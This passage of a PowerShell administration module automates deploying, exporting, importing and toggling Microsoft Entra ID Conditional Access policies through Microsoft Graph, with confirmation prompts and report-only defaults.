            Write-Verbose -Verbose -Message "   Checking for existing named location '$CountryListName'..."
            $ExistingCountryList = Get-MgIdentityConditionalAccessNamedLocation -Filter "DisplayName eq '$CountryListName'" -Top 1

            if ($ExistingCountryList) {
                Write-Verbose -Verbose -Message "   The named location '$($ExistingCountryList.DisplayName)' already exists!"
                $ExistingCountryList | Select-Object -Property Id, DisplayName
            } else {
                # Create named location if none existed.
                Write-Verbose -Verbose -Message "   Could not find '$CountryListName'. Creating named location..."
        
                $params = @{
                    "@odata.type" = "#microsoft.graph.countryNamedLocation"
                    DisplayName = "$CountryListName"
                    CountriesAndRegions = @(
                        $Countries
                    )
                    IncludeUnknownCountriesAndRegions = $true
                }
                
                New-MgIdentityConditionalAccessNamedLocation -BodyParameter $params | Select-Object -Property Id, DisplayName
            }
        }

        # Replace the named location names in the Json with the named location Ids.
         foreach ($PolicyCountryList in $PolicyCountryLists) {
            $Json = $Json -replace "ENTRACOUNTRYLIST_$CountryListOriginalName`_ENTRACOUNTRYLIST", $PolicyCountryList.Id
        }


        ### STEP 4: CREATE TERMS OF USE

        # Regex to extract content between "ENTRATERMSOFUSE_" and "_ENTRATERMSOFUSE"
        $Regex = "ENTRATERMSOFUSE_(.*?)_ENTRATERMSOFUSE"

        # Initialize an empty array
        $PolicyTermsOfUses = @()

        # Extract matches and store them in an array
        foreach ($Line in $Json -split "`n") {
            if ($Line -match $Regex) {
                $PolicyTermsOfUses += $Matches[1]
            }
        }

        # Loop through terms of uses and create missing ones.
        $PolicyTermsOfUses = foreach ($TermsOfUse in $PolicyTermsOfUses) {
            # Check for existing terms of use.
            Write-Verbose -Verbose -Message "   Checking for existing terms of use '$TermsOfUse'..."
            $ExistingTermsOfUse = Get-MgAgreement | where DisplayName -eq $TermsOfUse | Select-Object -Last 1

            if ($ExistingTermsOfUse) {
                Write-Verbose -Verbose -Message "   The terms of use '$($ExistingTermsOfUse.DisplayName)' already exists!"
                $ExistingTermsOfUse | Select-Object -Property Id, DisplayName
            } else {
                # Create terms of use if none existed.
                Write-Verbose -Verbose -Message "   Could not find '$TermsOfUse'. Creating terms of use..."
        
                # Download Terms of Use template from https://danielchronlund.com.
                Write-Verbose -Verbose -Message "   Downloading Terms of Use template from https://danielchronlund.com..."
                Invoke-WebRequest 'https://danielchronlundcloudtechblog.files.wordpress.com/2023/09/termsofuse.pdf' -OutFile 'termsofuse.pdf'

                $fileContent = get-content -Raw 'termsofuse.pdf'
                $fileContentBytes = [System.Text.Encoding]::Default.GetBytes($fileContent)
                $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)

                # Remove the local PDF file.
                Remove-Item 'termsofuse.pdf' -Force -ErrorAction SilentlyContinue

                $GraphBody = @"
{
    "displayName": "$TermsOfUse",
    "isViewingBeforeAcceptanceRequired": true,
    "files": [
        {
        "fileName": "termsofuse.pdf",
        "language": "en",
        "isDefault": true,
        "fileData": {
            "data": "$fileContentEncoded"
        }
        }
    ]
}
"@

                Write-Verbose -Verbose -Message "   Uploading terms of use to Entra ID..."

                Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/identityGovernance/termsOfUse/agreements' -Body $GraphBody | Select-Object -Property Id, DisplayName
            }
        }

        # Replace the terms of use names in the Json with the terms of uses Ids.
         foreach ($PolicyTermsOfUse in $PolicyTermsOfUses) {
            $Json = $Json -replace "ENTRATERMSOFUSE_$($PolicyTermsOfUse.DisplayName)`_ENTRATERMSOFUSE", $PolicyTermsOfUse.Id

            $Json = $Json | ConvertFrom-Json | Sort-Object | ConvertTo-Json -Depth 10
        }


        ### STEP 5: CREATE POLICY

        Start-Sleep -Seconds 1
        Write-Verbose -Verbose -Message "   Creating Conditional Access policy '$($Template.Name)'..."

        try {
            # Create new policies.
            $NewPolicies += (Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies' -Body $Json -ContentType 'application/json')

            $Template.JsonResult = $Json
        }
        catch {
            Write-Error -Message $_.Exception.Message -ErrorAction Continue
        }
    }


    # Output result:
    $NewPolicies | Select-Object displayName, state, id | Sort-Object displayName


    if ($SkipDocumentation -eq $false) {
        # Output Conditional Access documentation in Markdown format:
        # Markdown file path
        $MarkDownFile = "Conditional Access Design $(Get-Date -Format 'yyyy-MM-dd').md"
        Write-Verbose -Verbose -Message "Saving documentation in Markdownformat: '$MarkDownFile'..."

        # Write to the Markdown file
        @"
# Conditional Access Design

**Created:** $(Get-Date -Format 'yyyy-MM-dd')


## Introduction

This document outlines the configuration details for Entra ID Conditional Access (CA) policies within your organization. Conditional Access is a critical component of modern identity security, providing dynamic and automated access control decisions based on user, device, location, and session risk.

By leveraging Conditional Access, our goal is to enhance security posture while maintaining a seamless user experience. This design ensures that only trusted users and devices can access organizational resources under the right conditions, aligning with our compliance requirements and operational objectives.


## Policies

"@ > $MarkDownFile

        foreach ($Policy in $SelectedConditionalAccessTemplates) {
            # Define the desired order
            $desiredOrder = @('displayName', 'state', 'conditions', 'grantControls', 'sessionControls')

            # Convert JSON to PowerShell object
            $object = $Policy.JsonTemplate.Trim() | ConvertFrom-Json -Depth 10

            # Sort the properties
            $sortedObject = [PSCustomObject]@{
                # Add attributes in the desired order
                displayName      = $object.displayName
                state            = $object.state
                conditions       = $object.conditions
                grantControls    = $object.grantControls
                sessionControls  = $object.sessionControls
            }

            # Add any remaining attributes that were not in the desired order
            $remainingAttributes = $object.PSObject.Properties |
                Where-Object { $desiredOrder -notcontains $_.Name } |
                ForEach-Object {
                    Add-Member -InputObject $sortedObject -MemberType NoteProperty -Name $_.Name -Value $_.Value
                }

            # Convert back to JSON
            $Policy.JsonTemplate = $sortedObject | ConvertTo-Json -Depth 10


            Add-Content $MarkDownFile @"
- [$($Policy.Name)](#$($Policy.Name.ToLower() -replace ' ', '-' -replace '\(', '' -replace '\)', ''))

"@
        }

        foreach ($Policy in $SelectedConditionalAccessTemplates) {
            Add-Content $MarkDownFile @"

### $($Policy.Name)

| **Policy Name** | $($Policy.Name) |
| ----------- | ----------- |
| **ID** | $($Policy.Id) |
| **Description** | $($Policy.Description) |

``````json
$($Policy.JsonTemplate -replace 'ENTRAGROUP_', '' -replace '_ENTRAGROUP', '' -replace 'ENTRAIPLIST_', '' -replace '_ENTRAIPLIST', '' -replace 'ENTRACOUNTRYLIST_', '' -replace '_ENTRACOUNTRYLIST', '' -replace 'ENTRATERMSOFUSE_', '' -replace '_ENTRATERMSOFUSE', '')
``````

---

"@
        }
    }

    Write-Verbose -Verbose -Message "Done!"

    # ----- [End] -----

}



function Deploy-DCConditionalAccessBaselinePoC {
    <#
        .SYNOPSIS
            Automatically deploy the latest version of the Conditional Access policy design baseline from https://danielchronlund.com.

        .DESCRIPTION
            Automatically deploy the latest version of the Conditional Access policy design baseline from https://danielchronlund.com. It creates all necessary dependencies like exclusion groups, named locations, and terms of use, and then deploys all Conditional Access policies in the baseline.

            All Conditional Access policies created by this CMDlet will be set to report-only mode.

            The purpose of this tool is to quickly deploy the complete baseline as a PoC. You can then test, pilot, and deploy it going forward.

            You must be a Global Admin to run this command (because of the admin consent required) but no other preparations are required.
            
        .PARAMETER AddCustomPrefix
            Adds a custom prefix to all policy names.

        .PARAMETER SkipReportOnlyMode
            All Conditional Access policies created by this CMDlet will be set to report-only mode if you don't use this parameter. WARNING: Use this parameter with caution since ALL POLICIES will go live for ALL USERS when you specify this.

        .PARAMETER CreateDocumentation
            Creates a Markdown documentation of the baseline.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC

        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC -AddCustomPrefix 'PILOT - '

        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC -CreateDocumentation

        .EXAMPLE
            Deploy-DCConditionalAccessBaselinePoC -SkipReportOnlyMode # Use with caution!
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$AddCustomPrefix = '',

        [parameter(Mandatory = $false)]
        [switch]$CreateDocumentation,

        [parameter(Mandatory = $false)]
        [switch]$SkipReportOnlyMode
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Group.ReadWrite.All', 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All', 'Agreement.ReadWrite.All', 'Application.Read.All', 'RoleManagement.ReadWrite.Directory' -Verbose
    

    # Prompt for confirmation:
    if ($SkipReportOnlyMode) {
        $title    = 'Confirm'
        $question = "Do you want to deploy the Conditional Access baseline PoC (production mode) in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL POLICIES will go live for ALL USERS! Remove -SkipReportOnlyMode to deploy in report-only mode instead."
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    } else {
        $title    = 'Confirm'
        $question = "Do you want to deploy the Conditional Access baseline PoC (report-only) in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 0)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    }


    # Deploy Conditional Access baseline.
    Write-Verbose -Verbose -Message "Deploying Conditional Access policies..."

    $NewPolicies = $null

    if ($CreateDocumentation) {
        $NewPolicies = Invoke-DCConditionalAccessGallery -AddCustomPrefix $AddCustomPrefix -AutoDeployIds 1010, 1020, 1030, 1040, 1050, 1060, 1070, 1080, 1090, 1100, 2010, 2020, 3020, 2040, 2050, 2055, 2060, 2070, 3010, 3020, 3030, 3040, 0001
    } else {
        $NewPolicies = Invoke-DCConditionalAccessGallery -AddCustomPrefix $AddCustomPrefix -SkipDocumentation -AutoDeployIds 1010, 1020, 1030, 1040, 1050, 1060, 1070, 1080, 1090, 1100, 2010, 2020, 3020, 2040, 2050, 2055, 2060, 2070, 3010, 3020, 3030, 3040, 0001
    }

    if ($SkipReportOnlyMode) {
        foreach ($Policy in $NewPolicies) {
            Write-Verbose -Verbose -Message "Setting '$($Policy.displayName)' to enabled..."

            $params = @{
                State = "enabled"
            }
            
            Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.id -BodyParameter $params

            Start-Sleep -Seconds 1
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Export-DCConditionalAccessPolicyDesign {
    <#
        .SYNOPSIS
            Export all Conditional Access policies to JSON.

        .DESCRIPTION
            This CMDlet uses Microsoft Graph to export all Conditional Access policies in the tenant to a JSON file. This JSON file can be used for backup, documentation or to deploy the same policies again with Import-DCConditionalAccessPolicyDesign. You can basically treat Conditional Access as code!

            The user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).

        .PARAMETER FilePath
            The file path where the new JSON file will be created. Skip this to use the current path.

        .PARAMETER PrefixFilter
            Only export the policies with this prefix. The filter is case sensitive.

        .INPUTS
            None

        .OUTPUTS
            JSON file with all Conditional Access policies.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Export-DCConditionalAccessPolicyDesign

        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
            }
            Export-DCConditionalAccessPolicyDesign @Parameters
        
        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                PrefixFilter = 'GLOBAL - '
            }
            Export-DCConditionalAccessPolicyDesign @Parameters
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$FilePath = "$((Get-Location).Path)\Conditional Access Backup $(Get-Date -Format 'yyyy-MM-dd').json",

        [parameter(Mandatory = $false)]
        [string]$PrefixFilter
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Show filter settings.
    if ($PrefixFilter) {
        Write-Verbose -Verbose -Message "Prefix filter was set and only policies beginning with '$PrefixFilter' will be exported!"
    }


    # Export all Conditional Access policies from Microsoft Graph as JSON.
    Write-Verbose -Verbose -Message "Exporting Conditional Access policies to '$FilePath'..."
    
    $ConditionalAccessPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json

    $Result = foreach ($Policy in $ConditionalAccessPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
            Write-Verbose -Verbose -Message "Exporting $($Policy.DisplayName)..."

            $Policy.Id = 'REMOVETHISLINE'

            if ($Policy.GrantControls.authenticationStrength) {
                $params = @{
                    id = [string]$Policy.GrantControls.authenticationStrength.id
                }
    
                $Policy.GrantControls.authenticationStrength = $params
            }
            
            $Policy
        }
    }

    $Result | ConvertTo-Json -Depth 10 | Out-File -Force:$true -FilePath $FilePath


    # Perform some clean up in the JSON file.
    $CleanUp = Get-Content $FilePath | Select-String -Pattern '"REMOVETHISLINE"', '"createdDateTime":', '"modifiedDateTime":', 'authenticationStrength@odata.context' -NotMatch

    $CleanUp | Out-File -Force:$true -FilePath $FilePath


    Write-Verbose -Verbose -Message "Done!"
}



function Import-DCConditionalAccessPolicyDesign {
    <#
        .SYNOPSIS
            Import Conditional Access policies from JSON.

        .DESCRIPTION
            This CMDlet uses Microsoft Graph to automatically create Conditional Access policies from a JSON file.
            
            The JSON file can be created from existing policies with Export-DCConditionalAccessPolicyDesign or manually by following the syntax described in the Microsoft Graph documentation:
            https://docs.microsoft.com/en-us/graph/api/resources/conditionalaccesspolicy?view=graph-rest-1.0

            All Conditional Access policies created by this CMDlet will be set to report-only mode if you don't use the -SkipReportOnlyMode override.

            WARNING: If you want to, you can also delete all existing policies when deploying your new ones with -DeleteAllExistingPolicies, Use this parameter with caution and always create a backup with Export-DCConditionalAccessPolicyDesign first!

            The user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Security Admin, Conditional Access Admin, etc).

            As a best practice you should always have an Entra ID security group with break glass accounts excluded from all Conditional Access policies.
            
        .PARAMETER FilePath
            The file path of the JSON file containing your Conditional Access policies.

        .PARAMETER SkipReportOnlyMode
            All Conditional Access policies created by this CMDlet will be set to report-only mode if you don't use this parameter.

        .PARAMETER DeleteAllExistingPolicies
            WARNING: If you want to, you can delete all existing policies when deploying your new ones with -DeleteAllExistingPolicies, Use this parameter with causon and allways create a backup with Export-DCConditionalAccessPolicyDesign first!!

        .PARAMETER AddCustomPrefix
            Adds a custom prefix to all policy names.

        .PARAMETER PrefixFilter
            Only import (and delete) the policies with this prefix in the JSON file. The filter is case sensitive.
            
        .INPUTS
            JSON file containing your Conditional Access policies.

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                SkipReportOnlyMode = $false
                DeleteAllExistingPolicies = $false
            }

            Import-DCConditionalAccessPolicyDesign @Parameters

        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                SkipReportOnlyMode = $false
                DeleteAllExistingPolicies = $false
                AddCustomPrefix = 'PILOT - '
            }

            Import-DCConditionalAccessPolicyDesign @Parameters

        .EXAMPLE
            $Parameters = @{
                FilePath = 'C:\Temp\Conditional Access.json'
                SkipReportOnlyMode = $true
                DeleteAllExistingPolicies = $true
                PrefixFilter = 'GLOBAL - '
            }

            Import-DCConditionalAccessPolicyDesign @Parameters
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$FilePath,

        [parameter(Mandatory = $false)]
        [switch]$SkipReportOnlyMode,

        [parameter(Mandatory = $false)]
        [switch]$DeleteAllExistingPolicies,

        [parameter(Mandatory = $false)]
        [string]$AddCustomPrefix = '',

        [parameter(Mandatory = $false)]
        [string]$PrefixFilter
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Prompt for confirmation:
    if ($SkipReportOnlyMode) {
        $title    = 'Confirm'
        $question = "Do you want to import the Conditional Access policies from JSON file '$FilePath' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL POLICIES will go live for ALL USERS! Remove -SkipReportOnlyMode to deploy in report-only mode instead."
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    } else {
        $title    = 'Confirm'
        $question = "Do you want to import the Conditional Access policies from JSON file '$FilePath' in report-only mode in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 0)
        if ($decision -eq 0) {
            Write-Host ""
            Write-Verbose -Verbose -Message "Starting deployment..."
        } else {
            return
        }
    }


    # Show filter settings.
    if ($PrefixFilter) {
        Write-Verbose -Verbose -Message "Prefix filter was set and only policies beginning with '$PrefixFilter' will be affected!"
    }


    # Import policies from JSON file.
    Write-Verbose -Verbose -Message "Importing JSON from '$FilePath'..."
    $ConditionalAccessPolicies = Get-Content -Raw -Path $FilePath


    # Modify enabled policies to report-only if not skipped with -SkipReportOnlyMode.
    if (!($SkipReportOnlyMode)) {
        Write-Verbose -Verbose -Message "Setting new policies to report-only mode..."
        $ConditionalAccessPolicies = $ConditionalAccessPolicies -replace '"enabled"', '"enabledForReportingButNotEnforced"'
    }


    # Add prefix.
    $ConditionalAccessPolicies = $ConditionalAccessPolicies -replace '"displayName": "', """displayName"": ""$AddCustomPrefix"


    # Delete all existing policies if -DeleteAllExistingPolicies is specified.
    if ($DeleteAllExistingPolicies) {
        Write-Verbose -Verbose -Message "Deleting existing Conditional Access policies..."
        $GraphUri = 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies'
        $ExistingPolicies = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction SilentlyContinue

        foreach ($Policy in $ExistingPolicies) {
            if ($Policy.displayName.StartsWith($PrefixFilter)) {
                Start-Sleep -Seconds 1
                $GraphUri = "https://graph.microsoft.com/beta/identity/conditionalAccess/policies/$($Policy.id)"
    
                Invoke-MgGraphRequest -AccessToken $AccessToken -GraphMethod 'DELETE' -GraphUri $GraphUri -ErrorAction SilentlyContinue | Out-Null
            }
        }
    }


    $ConditionalAccessPolicies = $ConditionalAccessPolicies | ConvertFrom-Json

    foreach ($Policy in $ConditionalAccessPolicies) {
        if ($Policy.displayName.StartsWith($PrefixFilter)) {
            Start-Sleep -Seconds 1
            Write-Verbose -Verbose -Message "Creating '$($Policy.DisplayName)'..."

            try {
                # Create new policies.
                Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies' -Body ($Policy | ConvertTo-Json -Depth 10) | Out-Null
            }
            catch {
                Write-Error -Message $_.Exception.Message -ErrorAction Continue
            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Set-DCConditionalAccessPoliciesPilotMode {
    <#
        .SYNOPSIS
            Toggles Conditional Access policies between 'All users' and a specified pilot group.

        .DESCRIPTION
            This command helps you to quickly toggle you Conditional Access policies between a pilot and production. It does this by switching policies targeting a specified pilot group and 'All users'.

            It is common to use a dedicated Entra ID security group to target specific pilot users during a Conditional Access deployment project. When the pilot is completed you want to move away from that pilot group and target 'All users' in the organization instead (at least with your global baseline).

            You must filter the toggle with a prefix filter to only modify specific policies. Use a prefix like "GLOBAL -" or "PILOT -" for easy bulk management. This is a built-in safety measure.
            
        .PARAMETER PrefixFilter
            Only toggle the policies with this prefix. The filter is case sensitive.

        .PARAMETER PilotGroupName
            The name of your pilot group in Entra ID (must be a security group for users).

        .PARAMETER EnablePilot
            Modify all specified Conditional Access policies to target your pilot group.

        .PARAMETER EnableProduction
            Modify all specified Conditional Access policies to target 'All users'.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnablePilot

        .EXAMPLE
            Set-DCConditionalAccessPoliciesPilotMode -PrefixFilter 'GLOBAL - ' -PilotGroupName 'Conditional Access Pilot' -EnableProduction
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$PrefixFilter,

        [parameter(Mandatory = $true)]
        [string]$PilotGroupName,

        [parameter(Mandatory = $false)]
        [switch]$EnablePilot,

        [parameter(Mandatory = $false)]
        [switch]$EnableProduction
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Parameter check:
    if ($EnablePilot -and $EnableProduction)  {
        Write-Error -Message 'You can''t use -EnablePilot and -EnableProduction at the same time!'
        return
    } elseif (!($EnablePilot) -and !($EnableProduction)) {
        Write-Error -Message 'You must use -EnablePilot or -EnableProduction!'
        return
    }


    if ($EnableProduction) {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from pilot group '$PilotGroupName' to 'All users'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from 'All users' to pilot group '$PilotGroupName'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }


    # Check for existing group.
    Write-Verbose -Verbose -Message "Checking for existing pilot group '$PilotGroupName'..."
    $ExistingPilotGroup = Get-MgGroup -Filter "DisplayName eq '$PilotGroupName'" -Top 1

    if ($ExistingPilotGroup) {
        Write-Verbose -Verbose -Message "Found group '$PilotGroupName'!"
    } else {
        Write-Error -Message "Could not find group '$PilotGroupName'!"
        return
    }


    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to toggle..."
    $ExistingPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {

            if ($EnableProduction) {
                if ($Policy.Conditions.Users.IncludeGroups -contains $ExistingPilotGroup.Id) {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to 'All users'..."

                    # Toggle policy:
                    $params = @{
                        Conditions = @{
                            Users = @{
                                IncludeUsers = @(
                                    "All"
                                )
                            }
                        }
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
            } elseif ($EnablePilot) {
                if ($Policy.Conditions.Users.IncludeUsers -eq 'All') {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to pilot group..."

                    # Toggle policy:
                    $params = @{
                        Conditions = @{
                            Users = @{
                                IncludeUsers = @(
                                    "None"
                                )
                                IncludeGroups = @(
                                    "$($ExistingPilotGroup.Id)"
                                )
                            }
                        }
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Set-DCConditionalAccessPoliciesReportOnlyMode {
    <#
        .SYNOPSIS
            Toggles Conditional Access policies between 'Report-only' and Enabled.

        .DESCRIPTION
            This command helps you to quickly toggle you Conditional Access policies between Report-only and Enabled.

            If will skip any policies in Disabled state.

            You must filter the toggle with a prefix filter to only modify specific policies. This is a built-in safety measure.
            
        .PARAMETER PrefixFilter
            Only toggle the policies with this prefix. The filter is case sensitive.

        .PARAMETER SetToReportOnly
            Modify all specified Conditional Access policies to report-only.

        .PARAMETER SetToEnabled
            Modify all specified Conditional Access policies to Enabled.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToReportOnly

        .EXAMPLE
            Set-DCConditionalAccessPoliciesReportOnlyMode -PrefixFilter 'GLOBAL - ' -SetToEnabled
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$PrefixFilter,

        [parameter(Mandatory = $false)]
        [switch]$SetToReportOnly,

        [parameter(Mandatory = $false)]
        [switch]$SetToEnabled
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Parameter check:
    if ($SetToReportOnly -and $SetToEnabled)  {
        Write-Error -Message 'You can''t use -SetToReportOnly and -SetToEnabled at the same time!'
        return
    } elseif (!($SetToReportOnly) -and !($SetToEnabled)) {
        Write-Error -Message 'You must use -SetToReportOnly or -SetToEnabled!'
        return
    }


    if ($SetToEnabled) {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from Report-only to Enabled?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to switch all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' from Enabled to Report-only?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }


    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to toggle..."
    $ExistingPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {

            if ($SetToEnabled) {
                if ($Policy.State -eq 'enabledForReportingButNotEnforced') {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to Enabled..."

                    # Toggle policy:
                    $params = @{
                        State = "enabled"
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
            } elseif ($SetToReportOnly) {
                if ($Policy.State -eq 'Enabled') {
                    Write-Verbose -Verbose -Message "Toggling '$($Policy.DisplayName)' to Report-only..."

                    # Toggle policy:
                    $params = @{
                        State = "enabledForReportingButNotEnforced"
                    }
                    
                    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                    Start-Sleep -Seconds 1
                }
